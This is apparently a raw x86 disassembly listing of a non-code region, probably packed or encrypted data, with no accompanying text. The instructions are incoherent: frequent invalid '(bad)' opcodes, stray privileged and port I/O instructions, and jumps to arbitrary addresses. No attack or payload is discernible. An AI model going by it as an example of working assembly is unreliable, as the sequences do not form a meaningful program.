  423d1a:	(bad)  
  423d1c:	daa    
  423d1d:	inc    ebx
  423d1e:	call   0xb71629d
  423d23:	mov    eax,ds:0x1d243
  423d28:	outs   dx,BYTE PTR ds:[esi]
  423d29:	pop    es
  423d2a:	add    BYTE PTR [eax],al
  423d2c:	inc    esp
  423d2d:	cli    
  423d2e:	cld    
  423d2f:	xor    eax,0xcb17d11f
  423d34:	inc    ecx
  423d35:	jge    0x423d58
  423d37:	popf   
  423d38:	adc    BYTE PTR [edx+0x43],dh
  423d3b:	sysret 
  423d3d:	sub    al,0x6d
  423d3f:	ins    DWORD PTR es:[edi],dx
  423d40:	(bad)
  423d43:	jp     0x423d13
  423d45:	(bad)  [edx-0x72]
  423d48:	dec    esi
  423d49:	js     0x423d75
  423d4b:	retf   
  423d4c:	std    
  423d4d:	jne    0x423d32
  423d4f:	rcr    DWORD PTR [ebx+esi*2-0x33],0x37
  423d54:	push   edi
  423d55:	and    ebx,ebp
  423d57:	push   edx
  423d58:	or     al,0xb7
  423d5a:	dec    ebp
  423d5b:	lock mov eax,0xcbe233f
  423d61:	(bad)  
  423d62:	retf   
  423d63:	loope  0x423d87
  423d65:	mov    ch,0xd5
  423d67:	dec    edi
  423d68:	sbb    al,0xba
  423d6a:	adc    eax,0x6693d023
  423d6f:	aam    0x80
  423d71:	adc    DWORD PTR [edx+eax*4+0x1a],ebp
  423d75:	repnz sbb dl,al
  423d78:	mov    al,0xa9
  423d7a:	fisubr DWORD PTR [ebx-0x1dce6b95]
  423d80:	gs test eax,0xba752020
  423d86:	add    DWORD PTR [ebx+edx*8],eax
  423d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d8a:	hlt    
  423d8b:	sub    dl,bh
  423d8d:	cmc    
  423d8e:	mov    ch,al
  423d90:	or     BYTE PTR [eax+0x43],dh
  423d93:	push   ds
  423d94:	test   al,0x59
  423d96:	sub    BYTE PTR ds:0xf933d03,dh
  423d9c:	sbb    eax,0x2380cc6e
  423da1:	stos   DWORD PTR es:[edi],eax
  423da2:	aad    0xe1
  423da4:	mov    edi,0x3363c22c
  423da9:	leave  
  423daa:	cmp    dl,BYTE PTR [ebx]
  423dac:	push   es
  423dad:	(bad)  
  423dae:	int    0x68
  423db0:	inc    esi
  423db1:	xchg   edi,eax
  423db2:	inc    ebp
  423db3:	or     BYTE PTR [edi-0x2f],al
  423db6:	call   0x8cbb3353
  423dbb:	or     bh,cl
  423dbd:	lds    esi,FWORD PTR [edx+edi*2+0x3cae5dff]
  423dc4:	pop    eax
  423dc5:	sbb    ebp,DWORD PTR [ebx-0x6d]
  423dc8:	ins    BYTE PTR es:[edi],dx
  423dc9:	mov    cl,0xd4
  423dcb:	cli    
  423dcc:	mov    WORD PTR [ebx],cs
  423dce:	pop    edi
  423dcf:	iret   
  423dd0:	mov    ds:0x241b794a,al
  423dd5:	add    al,0xaa
  423dd7:	repnz dec eax
  423dd9:	movd   DWORD PTR [ecx-0x1f],mm0
  423ddd:	push   cs
  423dde:	std    
  423ddf:	cmp    BYTE PTR [edi-0x300f9b9e],bh
  423de5:	ins    BYTE PTR es:[edi],dx
  423de6:	jno    0x423e55
  423de8:	mov    ds:0xc12c3cc4,al
  423ded:	ds push cs
  423def:	push   ss
  423df0:	jno    0x423e55
  423df2:	nop
  423df3:	es pop ecx
  423df5:	mov    ss,WORD PTR [eax]
  423df7:	sub    DWORD PTR [esi],ebp
  423df9:	bound  eax,QWORD PTR [edi+0x25]
  423dfc:	cmp    esp,DWORD PTR [esi-0x2eb19f90]
  423e02:	in     al,0xd3
  423e04:	mov    esp,0xbf214c96
  423e09:	inc    ebp
  423e0a:	push   0xffffff90
  423e0c:	jp     0x423dd2
  423e0e:	fdivr  QWORD PTR [edi]
  423e10:	ror    BYTE PTR [eax-0x31],1
  423e13:	sbb    BYTE PTR [esi+eiz*8+0x4d],bh
  423e17:	xchg   ecx,eax
  423e18:	mov    dh,0xa7
  423e1a:	js     0x423e44
  423e1c:	mov    BYTE PTR [ecx],cl
  423e1e:	popa   
  423e1f:	cmp    BYTE PTR [ecx+0x70aba8cc],ch
  423e25:	call   0x4851edf8
  423e2a:	mov    esp,0xb96fe4c3
  423e2f:	adc    eax,0x7b943e80
  423e34:	lods   eax,DWORD PTR ds:[esi]
  423e35:	inc    edi
  423e36:	add    BYTE PTR [eax+edx*4+0x6e],0x7c
  423e3b:	pop    ebp
  423e3c:	mov    ecx,0xbe933974
  423e41:	ss mov bh,0x9e
  423e44:	cmp    BYTE PTR [eax],ah
  423e46:	es pop eax
  423e48:	cdq    
  423e49:	mov    BYTE PTR [edx-0x4b3805b8],cl
  423e4f:	sbb    esp,esp
  423e51:	sti    
  423e52:	xor    DWORD PTR [edx+edx*4-0x7bfb7946],0x76
  423e5a:	jecxz  0x423ebb
  423e5c:	nop
  423e5d:	cmp    dl,BYTE PTR [edx-0x7a]
  423e60:	dec    ebp
  423e61:	in     al,dx
  423e62:	jg     0x423dfc
  423e64:	gs in  al,dx
  423e66:	stos   DWORD PTR es:[edi],eax
  423e67:	pop    esi
  423e68:	cli    
  423e69:	inc    eax
  423e6a:	sbb    al,0xab
  423e6c:	mov    ds:0x2de16899,eax
  423e71:	mov    dl,0xb1
  423e73:	int    0xd1
  423e75:	(bad)  
  423e76:	push   esp
  423e77:	hlt    
  423e78:	pusha  
  423e79:	mov    DWORD PTR [ebx-0x247c9dc4],esp
  423e7f:	dec    esi
  423e80:	sbb    ebx,ebp
  423e82:	xor    bh,BYTE PTR [ebx+0x5a74fa96]
  423e88:	push   edi
  423e89:	in     eax,0x12
  423e8b:	cmp    eax,0xc1860ce6
  423e90:	addr16 imul eax,ecx,0x10
  423e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e95:	hlt    
  423e96:	xor    al,0xf8
  423e98:	sub    ch,BYTE PTR [edx]
  423e9a:	dec    edx
  423e9b:	int    0x22
  423e9d:	clc    
  423e9e:	into   
  423e9f:	loope  0x423e91
  423ea1:	div    BYTE PTR [esi]
  423ea3:	mov    ah,0xfc
  423ea5:	bound  ebx,QWORD PTR [edx]
  423ea7:	add    eax,0x1eabe838
  423eac:	cmp    edi,DWORD PTR [esi+eax*1+0x4bc8f00]
  423eb3:	xor    eax,DWORD PTR [ebx-0x12]
  423eb6:	rol    BYTE PTR [ecx+ecx*8-0x23caba50],0x36
  423ebe:	cmp    al,0x86
  423ec0:	jl     0x423ebd
  423ec2:	and    esi,DWORD PTR [ecx+0xc]
  423ec5:	aam    0x5b
  423ec7:	sbb    eax,0xdbec93d2
  423ecc:	(bad)  
  423ece:	mov    ecx,0xa4642270
  423ed3:	ds das 
  423ed5:	lock sbb ebp,DWORD PTR [esi+ebx*1+0x4dcd5caf]
  423edd:	and    DWORD PTR [ecx-0x48],edx
  423ee0:	push   0x69164de3
  423ee5:	mov    ecx,0x53067c43
  423eea:	mov    dh,0x76
  423eec:	daa    
  423eed:	pop    esp
  423eee:	adc    ah,BYTE PTR [eax]
  423ef0:	push   ebx
  423ef2:	jne    0x423e9b
  423ef4:	ss jp  0x423e77
  423ef7:	enter  0xcf9b,0x45
  423efb:	mov    eax,0x18f2731e
  423f00:	je     0x423f65
  423f02:	inc    ebx
  423f03:	fst    QWORD PTR [eax]
  423f05:	cld    
  423f06:	test   BYTE PTR ds:0x3ab76c3a,ch
  423f0c:	cmp    ch,BYTE PTR [ebx-0x5b63f1f9]
  423f12:	jns    0x423ecf
  423f14:	cld    
  423f15:	call   0x86df:0xb945ae48
  423f1c:	fimul  DWORD PTR [esi+0x65c7cfbd]
  423f22:	inc    esp
  423f23:	mov    ebx,0x8956ddb6
  423f28:	mov    esi,0x2a45cdff
  423f2d:	aam    0xe2
  423f2f:	cmp    bh,bh
  423f31:	push   eax
  423f32:	jmp    0xfcc4306b
  423f37:	cmp    DWORD PTR [eax-0x76cc73ab],eax
  423f3d:	sbb    al,0xdc
  423f3f:	or     al,0xb6
  423f41:	dec    ecx
  423f42:	inc    edx
  423f43:	xor    BYTE PTR [edx+0x4f],dh
  423f46:	or     edx,edx
  423f48:	pop    edx
  423f49:	xor    esi,DWORD PTR [edx]
  423f4b:	ret    0xdf51
  423f4e:	ds sbb cl,bl
  423f51:	imul   esp,DWORD PTR [ebp-0x1],0x18
  423f55:	repz mov WORD PTR [ebx+eiz*4-0x37],?
  423f5a:	(bad)  
  423f5b:	dec    edx
  423f5c:	pop    ds
  423f5d:	adc    al,0xe7
  423f5f:	lods   al,BYTE PTR ds:[esi]
  423f60:	retf   
  423f61:	adc    al,0xf
  423f63:	addr16 in al,dx
  423f65:	sub    eax,0x31a505e
  423f6a:	push   esi
  423f6b:	ins    BYTE PTR es:[edi],dx
  423f6c:	mov    edx,0xb743ff6d
  423f71:	adc    al,0x37
  423f73:	sub    DWORD PTR [ecx],esp
  423f75:	push   eax
  423f76:	out    0xba,eax
  423f78:	dec    esp
  423f79:	inc    ebx
  423f7a:	xchg   eax,ebx
  423f7c:	jnp    0x423fa9
  423f7e:	enter  0xd345,0xc8
  423f82:	sub    eax,0x67bda06
  423f87:	out    dx,al
  423f88:	xchg   esp,eax
  423f89:	inc    ecx
  423f8a:	add    cl,bh
  423f8c:	cmp    esi,eax
  423f8e:	dec    edi
  423f8f:	sub    al,0xc3
  423f91:	mov    eax,0xfe881e43
  423f96:	inc    ebp
  423f97:	iret   
  423f98:	dec    esp
  423f99:	and    dl,al
  423f9b:	mov    al,0x89
  423f9d:	push   ebp
  423f9e:	sub    al,0x13
  423fa0:	xor    dl,ch
  423fa2:	lock clc 
  423fa4:	jmp    0x423f39
  423fa6:	outs   dx,BYTE PTR ds:[esi]
  423fa7:	cli    
  423fa8:	jg     0x423f60
  423faa:	sub    ebx,esi
  423fac:	push   esi
  423fad:	sub    al,0x58
  423faf:	hlt    
  423fb0:	push   ecx
  423fb1:	enter  0x5ac1,0xbb
  423fb5:	lods   al,BYTE PTR ds:[esi]
  423fb6:	adc    esp,DWORD PTR [esi]
  423fb8:	cmp    eax,0x236f2145
  423fbd:	pop    ebp
  423fbe:	mov    cl,0x31
  423fc0:	or     DWORD PTR [ecx],edx
  423fc2:	imul   eax,edx,0xffffffe2
  423fc5:	cli    
  423fc6:	call   0x8c592e38
  423fcb:	jge    0x423fd3
  423fcd:	test   eax,0xe2b9978e
  423fd2:	cmp    al,0x3c
  423fd4:	push   es
  423fd5:	xor    al,0x9e
  423fd7:	mov    WORD PTR [ecx+0x8],fs
  423fda:	cmp    al,0x19
  423fdc:	icebp  
  423fdd:	out    0x18,al
  423fdf:	pop    edi
  423fe0:	adc    DWORD PTR [edi-0x56],0xbc802246
  423fe7:	hlt    
  423fe8:	push   ebx
  423fe9:	mov    ebp,0xe7850b31
  423fee:	jo     0x424024
  423ff0:	mov    esp,0x3551243c
  423ff5:	mov    ebx,0x7425352
  423ffa:	outs   dx,BYTE PTR ds:[esi]
  423ffb:	inc    ecx
  423ffc:	push   edx
  423ffd:	sbb    al,0xf3
  423fff:	mov    bl,0x0
  424001:	sbb    al,0xa7
  424003:	sahf   
  424004:	jns    0x423f95
  424006:	inc    eax
  424007:	mov    edx,DWORD PTR [ecx-0x1a0e7d70]
  42400d:	pop    ds
  42400e:	test   BYTE PTR [ebp+edi*1+0x5e63c2ff],al
  424015:	dec    esp
  424016:	add    DWORD PTR ds:0x5434bbe0,esp
  42401c:	lea    eax,[ecx]
  42401e:	sbb    edx,DWORD PTR [esi+0x17ad93f7]
  424024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424025:	aam    0xa2
  424027:	pop    eax
  424028:	mov    ch,0xa9
  42402a:	test   eax,0x2c724364
  42402f:	adc    BYTE PTR [eax+0x2c],al
  424032:	lea    esp,[edi-0xe]
  424035:	jmp    0x60277bbc
  42403a:	dec    ecx
  42403b:	mov    al,ds:0xea6d4b69
  424040:	mov    BYTE PTR [edi-0x22412b2e],al
  424046:	sbb    al,0xd9
  424048:	addr16 dec ebp
  42404a:	rcr    DWORD PTR [edi+ebp*1],0x61
  42404e:	das    
  42404f:	out    0x6a,eax
  424051:	in     al,0x54
  424053:	leave  
  424054:	adc    dl,ah
  424056:	aad    0xcf
  424058:	pop    ds
  424059:	xor    BYTE PTR [eax-0x47],bl
  42405c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42405d:	icebp  
  42405e:	ss aaa 
  424060:	dec    ebp
  424061:	loopne 0x4240c2
  424063:	fcomp  DWORD PTR [edi-0x44]
  424066:	stos   DWORD PTR es:[edi],eax
  424067:	xchg   esp,eax
  424068:	imul   eax,DWORD PTR [esi+0x67],0xffffffdb
  42406c:	js     0x42408d
  42406e:	(bad)  
  42406f:	sbb    BYTE PTR [ecx+0x39],ch
  424072:	push   es
  424073:	xor    eax,0xdf1c242b
  424078:	push   esp
  424079:	fst    QWORD PTR [eax]
  42407b:	push   0xd19539b4
  424080:	jb     0x4240af
  424082:	ja     0x424036
  424084:	or     bl,cl
  424086:	add    al,BYTE PTR [edi]
  424088:	repnz cmp BYTE PTR [ecx+0x4eba5b49],0x31
  424090:	adc    DWORD PTR [edx],esp
  424092:	dec    ecx
  424093:	nop
  424094:	xor    eax,0xc847e0c6
  424099:	mov    dh,BYTE PTR [esi+0x3e]
  42409c:	push   esp
  42409d:	push   edx
  42409e:	mov    ecx,0xf5d72aa5
  4240a3:	cdq    
  4240a4:	sub    eax,0xca72d898
  4240a9:	aam    0xa1
  4240ab:	and    edx,DWORD PTR [ebp+eax*8+0x6e]
  4240af:	lods   eax,DWORD PTR ds:[esi]
  4240b0:	daa    
  4240b1:	or     BYTE PTR [edi-0x19],dl
  4240b4:	xor    BYTE PTR [edx],cl
  4240b6:	cmc    
  4240b7:	adc    DWORD PTR [ebp+0x2],0x0
  4240bb:	aad    0x9a
  4240bd:	add    BYTE PTR [ecx-0xf],dh
  4240c0:	in     al,dx
  4240c1:	daa    
  4240c2:	jmp    0xd2d1:0xfec631b6
  4240c9:	or     DWORD PTR [ebx-0x1fb70773],ebx
  4240cf:	in     al,0x62
  4240d1:	lods   al,BYTE PTR ds:[esi]
  4240d2:	cmp    ch,dh
  4240d4:	adc    edx,DWORD PTR [eax-0x62cdaf27]
  4240da:	int    0x46
  4240dc:	jb     0x42412b
  4240de:	add    al,0xc6
  4240e0:	mov    ds:0xdfff4560,eax
  4240e5:	in     eax,dx
  4240e6:	sbb    BYTE PTR es:[edx],dl
  4240e9:	mov    eax,ds:0xf6278089
  4240ee:	jo     0x42412b
  4240f0:	mov    al,ds:0x283c460c
  4240f5:	sub    ebp,edi
  4240f7:	and    ecx,DWORD PTR [edx+0x549b27b6]
  4240fd:	push   edx
  4240fe:	mov    edi,0xf7053eb6
  424103:	mov    ebx,0xb8b7941e
  424108:	nop
  424109:	das    
  42410a:	aas    
  42410b:	cmp    eax,0x6ad4c538
  424110:	test   eax,0xc51f700b
  424115:	aas    
  424116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424117:	push   ecx
  424118:	nop
  424119:	pop    esp
  42411a:	pop    eax
  42411b:	in     al,0x6
  42411d:	ret    0x8994
  424120:	or     esi,0x1e
  424123:	push   ebp
  424124:	or     eax,0xc8fffd8f
  424129:	xchg   edi,eax
  42412a:	push   edx
  42412b:	mov    al,0x4e
  42412d:	mov    bh,0x86
  42412f:	sbb    DWORD PTR [edx+0x784f71f4],0x871b7e40
  424139:	shl    dl,0x67
  42413c:	sbb    dh,BYTE PTR [ebx+eiz*2+0x4]
  424140:	push   0xa089bcf8
  424145:	jmp    0x1292c1de
  42414a:	daa    
  42414b:	xor    al,0x2c
  42414d:	push   0x7a1640f0
  424152:	xchg   esi,eax
  424153:	pop    ebp
  424154:	xchg   edx,eax
  424155:	les    edx,FWORD PTR [esi-0x288e85aa]
  42415b:	and    eax,0x8a2c0ffd
  424160:	sbb    al,0x71
  424162:	lea    esp,[ebx-0x3c]
  424165:	sub    eax,DWORD PTR [ecx+0x734ea942]
  42416b:	mov    gs,WORD PTR [ecx]
  42416d:	or     BYTE PTR [ecx+esi*4+0xc0e7d2f],dl
  424174:	inc    ebp
  424175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424176:	pop    esi
  424177:	mov    ecx,0x2622e11b
  42417c:	(bad)  
  42417e:	mov    ebp,DWORD PTR [esi]
  424180:	pusha  
  424181:	das    
  424182:	fdivr  QWORD PTR [esi]
  424184:	shr    BYTE PTR [ecx-0x7057b],0xfb
  42418b:	popf   
  42418c:	push   ebp
  42418d:	idiv   DWORD PTR [ebp-0x3c23126b]
  424193:	daa    
  424194:	jbe    0x424197
  424196:	out    dx,al
  424197:	pop    ss
  424198:	add    eax,0x7b45d737
  42419d:	out    0x74,eax
  42419f:	dec    ecx
  4241a0:	jp     0x42417b
  4241a2:	sbb    DWORD PTR [esi],edx
  4241a4:	push   eax
  4241a5:	(bad)  
  4241a6:	aaa    
  4241a7:	mov    esp,0xf3133718
  4241ac:	jbe    0x42420e
  4241ae:	add    eax,eax
  4241b0:	add    DWORD PTR [ebx+0x561b2b14],0x63
  4241b7:	push   esp
  4241b8:	mov    bl,0xc1
  4241ba:	mov    esi,0xd488323c
  4241bf:	jl     0x4241ac
  4241c1:	push   0xd19f9ff3
  4241c6:	push   eax
  4241c7:	sub    al,0x76
  4241c9:	ret    0xc8a7
  4241cc:	ja     0x42422d
  4241ce:	(bad)  
  4241cf:	cdq    
  4241d0:	scas   al,BYTE PTR es:[edi]
  4241d1:	pusha  
  4241d2:	adc    ah,BYTE PTR es:[edi]
  4241d5:	sub    al,0x3d
  4241d7:	mov    ds:0xb119b1db,al
  4241dc:	sub    al,0x1c
  4241de:	inc    edx
  4241df:	imul   ebp,esi,0xa9d44cef
  4241e5:	add    al,0x39
  4241e7:	stc    
  4241e8:	adc    bl,al
  4241ea:	sub    edx,DWORD PTR [esi+edx*1-0x5d9c55ff]
  4241f1:	inc    ecx
  4241f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241f3:	push   edi
  4241f4:	xchg   edx,eax
  4241f5:	jl     0x42423b
  4241f7:	inc    edx
  4241f8:	xchg   ebp,eax
  4241f9:	out    dx,eax
  4241fa:	push   ds
  4241fb:	not    BYTE PTR [ecx-0x56]
  4241fe:	les    edx,FWORD PTR [eax+edx*1]
  424201:	xlat   BYTE PTR ds:[ebx]
  424202:	stos   DWORD PTR es:[edi],eax
  424203:	gs mov esi,0x343ee223
  424209:	ror    DWORD PTR [ecx-0x47b8f2b4],cl
  42420f:	arpl   cx,di
  424211:	int    0x13
  424213:	(bad)  
  424215:	jle    0x4241d0
  424217:	std    
  424218:	test   al,0x60
  42421a:	xor    ch,dl
  42421c:	fcmovb st,st(2)
  42421e:	aas    
  42421f:	stos   BYTE PTR es:[edi],al
  424220:	sbb    DWORD PTR [ebx],ebx
  424222:	pop    ecx
  424223:	popf   
  424224:	dec    edx
  424225:	test   BYTE PTR [edx],al
  424227:	dec    edx
  424228:	adc    edx,DWORD PTR [edx+0x6]
  42422b:	xchg   edx,eax
  42422c:	retf   
  42422d:	add    DWORD PTR [ebx-0x729e4add],ebp
  424233:	lds    edx,FWORD PTR [ecx]
  424235:	xor    ebp,DWORD PTR [edx]
  424237:	(bad)  
  424238:	sub    dl,dl
  42423a:	mov    bh,0x2f
  42423c:	fadd   QWORD PTR [ebx]
  42423e:	leave  
  42423f:	push   edx
  424240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424241:	sbb    al,0xeb
  424243:	sbb    DWORD PTR [ebx+esi*1],ebx
  424246:	pushf  
  424247:	sub    cl,BYTE PTR [ebx+0x2f]
  42424a:	mov    ecx,0xc7432976
  42424f:	xchg   ecx,eax
  424250:	outs   dx,BYTE PTR ds:[esi]
  424251:	or     al,0x28
  424253:	(bad)  
  424254:	mov    edx,0x91d33086
  424259:	sar    bl,1
  42425b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42425c:	imul   eax,DWORD PTR [eax],0x5ed203bc
  424262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424263:	repz cs dec esi
  424266:	xor    DWORD PTR [bx+di+0x2fab],0x43
  42426c:	mov    dl,0x2e
  42426e:	je     0x42422d
  424270:	and    al,0xde
  424272:	into   
  424273:	std    
  424274:	lods   eax,DWORD PTR ds:[esi]
  424275:	jbe    0x4242d6
  424277:	repz adc BYTE PTR [esi-0x1350309b],ah
  42427e:	xor    al,0xdc
  424280:	jge    0x4242a4
  424282:	mov    bh,bh
  424284:	jo     0x4242ea
  424286:	or     DWORD PTR es:[eax-0x8],ebp
  42428a:	lods   al,BYTE PTR ds:[esi]
  42428b:	mov    cl,0xb2
  42428d:	and    eax,0x71688754
  424292:	mov    bh,BYTE PTR [esi+0x4]
  424295:	mov    esi,0xda452c79
  42429a:	push   ebx
  42429b:	(bad)  
  42429d:	test   eax,0xf2930f10
  4242a2:	cmc    
  4242a3:	sbb    BYTE PTR [ecx+0x7306a514],al
  4242a9:	hlt    
  4242aa:	jns    0x424321
  4242ac:	(bad)  
  4242ad:	mov    esi,0xc21ac523
  4242b2:	jecxz  0x4242fa
  4242b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242b5:	jns    0x4242e4
  4242b7:	outs   dx,DWORD PTR ds:[esi]
  4242b8:	lahf   
  4242b9:	dec    ebx
  4242ba:	mov    al,0x50
  4242bc:	pusha  
  4242bd:	xor    ch,BYTE PTR [esi]
  4242bf:	and    dl,BYTE PTR [ecx+0x74c7df80]
  4242c5:	mov    ch,0x8
  4242c7:	pushf  
  4242c8:	dec    ebp
  4242c9:	push   ecx
  4242ca:	jmp    0x4242bb
  4242cc:	sub    bh,cl
  4242ce:	cld    
  4242cf:	inc    esp
  4242d0:	adc    esp,DWORD PTR [ebx-0x44]
  4242d3:	shl    BYTE PTR [ecx],1
  4242d5:	ds inc esi
  4242d7:	cmp    BYTE PTR [ebp-0x5a4e1773],0xb1
  4242de:	jnp    0x424268
  4242e0:	add    cl,BYTE PTR [eax]
  4242e2:	mov    edi,0xaee6256d
  4242e7:	mov    DWORD PTR [ebp-0x30efaf35],0xf9542c76
  4242f1:	add    al,0x8d
  4242f3:	push   esp
  4242f4:	cdq    
  4242f5:	ret    0x3460
  4242f8:	stc    
  4242f9:	push   edx
  4242fa:	les    ebx,FWORD PTR [eax+0x37487f91]
  424300:	out    dx,eax
  424301:	bound  ebx,QWORD PTR [eax-0x40]
  424304:	sub    BYTE PTR [edi],0x7b
  424307:	fidivr DWORD PTR [ecx-0x24500ebc]
  42430d:	xlat   BYTE PTR ds:[ebx]
  42430e:	shl    ch,0xc1
  424311:	fst    DWORD PTR [esi+0x1368302a]
  424317:	call   0x7030:0x6aee17d1
  42431e:	cmp    al,BYTE PTR [edx-0x34]
  424321:	jnp    0x42435e
  424323:	loope  0x4242e5
  424325:	xor    eax,0xcc062c4c
  42432a:	dec    dx
  42432c:	mov    fs,WORD PTR [ebx]
  42432e:	fwait
  42432f:	dec    eax
  424330:	sbb    ebx,DWORD PTR [edx+0x8697091]
  424336:	ret    0x3c48
  424339:	push   es
  42433a:	add    DWORD PTR ss:[ebp-0x2eafae52],ebx
  424341:	xor    ch,ah
  424343:	je     0x424302
  424345:	repnz daa 
  424347:	(bad)  
  424348:	dec    ebx
  424349:	imul   edi,DWORD PTR [eax],0x7
  42434c:	int3   
  42434d:	int3   
  42434e:	jp     0x4243c7
  424350:	scas   eax,DWORD PTR es:[edi]
  424351:	fisubr WORD PTR [edx+0x69ea2a90]
  424357:	repnz stc 
  424359:	pop    eax
  42435a:	ficomp WORD PTR [ecx+0x4d450287]
  424360:	and    edi,DWORD PTR [edi]
  424362:	dec    ecx
  424363:	clc    
  424364:	(bad)  
  424365:	jecxz  0x4243c2
  424367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424368:	mov    bh,0xeb
  42436a:	hlt    
  42436b:	or     edi,esp
  42436d:	inc    ebp
  42436e:	sub    esi,DWORD PTR [esi-0xca69859]
  424374:	and    cl,BYTE PTR [ebx-0x23]
  424377:	or     BYTE PTR [ebp+0x46bc5ae3],dh
  42437d:	adc    ah,ah
  42437f:	mov    DWORD PTR [eax+0x2a],edx
  424382:	bound  esi,QWORD PTR [ebx]
  424384:	cwde   
  424385:	imul   edi,edi,0x1cbf1a2e
  42438b:	call   0xfb21bd73
  424390:	mov    eax,ds:0xbf414a
  424395:	add    esp,ebx
  424397:	mov    dl,0xdf
  424399:	(bad)  
  42439a:	fadd   st,st(2)
  42439c:	push   ebp
  42439d:	shl    eax,0x5b
  4243a0:	stos   DWORD PTR es:[edi],eax
  4243a1:	add    al,0x21
  4243a3:	aam    0x28
  4243a5:	mov    dl,0xb1
  4243a7:	push   esp
  4243a8:	dec    ebx
  4243a9:	adc    eax,0xeb3ecada
  4243ae:	test   eax,0x460dd33b
  4243b3:	mov    al,ds:0x1b207be1
  4243b8:	jnp    0x424410
  4243ba:	jg     0x4243e3
  4243bc:	mov    BYTE PTR [ebx-0x76ff9541],al
  4243c2:	into   
  4243c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243c4:	je     0x424351
  4243c6:	sbb    DWORD PTR [edi],eax
  4243c8:	rol    BYTE PTR [edx+0x32],0x49
  4243cc:	dec    eax
  4243cd:	addr16 call 0x28801fb7
  4243d3:	bnd jl 0x42440b
  4243d6:	sub    al,0xf2
  4243d8:	es pop ss
  4243da:	xchg   edi,eax
  4243db:	dec    ebp
  4243dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243dd:	pop    edx
  4243de:	daa    
  4243df:	cmp    ebp,DWORD PTR [esi-0x31]
  4243e2:	or     ebx,0xfffffffe
  4243e5:	mov    ebp,0x55ee66cb
  4243ea:	hlt    
  4243eb:	push   esi
  4243ec:	pop    es
  4243ed:	ss push ds
  4243ef:	loopne 0x42439f
  4243f1:	aaa    
  4243f2:	es sub eax,0xe5adc92a
  4243f8:	scas   al,BYTE PTR es:[edi]
  4243f9:	jl     0x424380
  4243fb:	or     eax,0x5602ff55
  424400:	add    ch,BYTE PTR ds:0x9812633d
  424406:	les    ecx,FWORD PTR [ecx-0x345cf540]
  42440c:	add    ah,BYTE PTR [ecx]
  42440e:	xchg   ecx,eax
  42440f:	fidiv  DWORD PTR [ecx]
  424411:	or     esi,DWORD PTR [eax+0x50]
  424414:	jle    0x424408
  424416:	retf   0x1149
  424419:	lods   al,BYTE PTR ds:[esi]
  42441a:	mov    bl,0x19
  42441c:	add    DWORD PTR [ebx-0x26],0xffffffef
  424420:	popf   
  424421:	(bad)  
  424423:	inc    edx
  424424:	cmp    BYTE PTR [ebx*1+0x1ee0919d],dh
  42442b:	repz or al,0x4a
  42442e:	leave  
  42442f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424430:	add    DWORD PTR [esi],0x802b2943
  424436:	cwde   
  424437:	(bad)  
  424438:	jmp    0x4243d4
  42443a:	js     0x42446a
  42443c:	push   eax
  42443d:	adc    ebp,esp
  42443f:	xchg   ch,al
  424441:	cmp    eax,0x96b53d17
  424446:	test   eax,0xf9913ce2
  42444b:	cld    
  42444c:	dec    ebx
  42444d:	idiv   DWORD PTR [esi+0x32f06b4e]
  424453:	push   cs
  424454:	mov    dl,0x8e
  424456:	aam    0xca
  424458:	lds    ebx,FWORD PTR [eax]
  42445a:	add    DWORD PTR [esi],ebx
  42445c:	xchg   ecx,eax
  42445d:	adc    BYTE PTR [ebp-0x5cedabf7],dh
  424463:	sbb    al,0xf7
  424465:	int    0x9e
  424467:	mov    esp,ebp
  424469:	outs   dx,BYTE PTR ds:[esi]
  42446a:	jmp    0x4244b7
  42446c:	xchg   ecx,eax
  42446d:	mov    eax,esp
  42446f:	clc    
  424470:	inc    edx
  424471:	stc    
  424472:	pop    eax
  424473:	std    
  424474:	stc    
  424475:	xor    esp,DWORD PTR [edi-0xda62541]
  42447b:	(bad)  
  42447c:	sbb    eax,0x48977717
  424481:	dec    ecx
  424482:	and    eax,0xa8562267
  424487:	sbb    al,0xeb
  424489:	push   ecx
  42448a:	or     BYTE PTR [ebx-0x20],0x2d
  42448e:	in     al,0xdc
  424490:	xchg   ecx,eax
  424491:	call   0xd45a003f
  424496:	out    0x31,eax
  424498:	fwait
  424499:	lds    eax,FWORD PTR [eax]
	...
  424513:	add    BYTE PTR [esi],cl
  424515:	pop    esp
  424516:	mov    esp,0xffe7fe47
  42451b:	pop    ebp
  42451c:	es mov eax,0x6248fe17
  424522:	jmp    0x424568
  424524:	mov    cl,0xd9
  424526:	add    DWORD PTR [eax],eax
  424528:	outs   dx,BYTE PTR ds:[esi]
  424529:	pop    es
  42452a:	add    BYTE PTR [eax],al
  42452c:	push   0xe950e35c
  424531:	jmp    0x424515
  424533:	dec    eax
  424534:	inc    edx
  424535:	(bad)  
  424536:	pop    edx
  424537:	out    dx,al
  424538:	int    0xb7
  42453a:	mov    eax,ds:0xb989f638
  42453f:	push   0x9
  424541:	imul   ebp,DWORD PTR [esi-0x31],0xd64ece26
  424548:	and    ah,BYTE PTR [edx+0x13]
  42454b:	stos   DWORD PTR es:[edi],eax
  42454c:	cmp    eax,0xdc12913b
  424551:	outs   dx,DWORD PTR ds:[esi]
  424552:	addr16 or eax,0x7f6ee261
  424558:	xlat   BYTE PTR ds:[ebx]
  424559:	push   esp
  42455a:	xor    al,0x11
  42455c:	dec    esp
  42455d:	pusha  
  42455e:	and    al,0xf5
  424560:	outs   dx,BYTE PTR ds:[esi]
  424561:	add    cl,bh
  424563:	iret   
  424564:	pop    ss
  424565:	cmp    BYTE PTR fs:[eax+0x49],bh
  424569:	das    
  42456a:	aam    0x3e
  42456c:	lock nop
  42456e:	aad    0x96
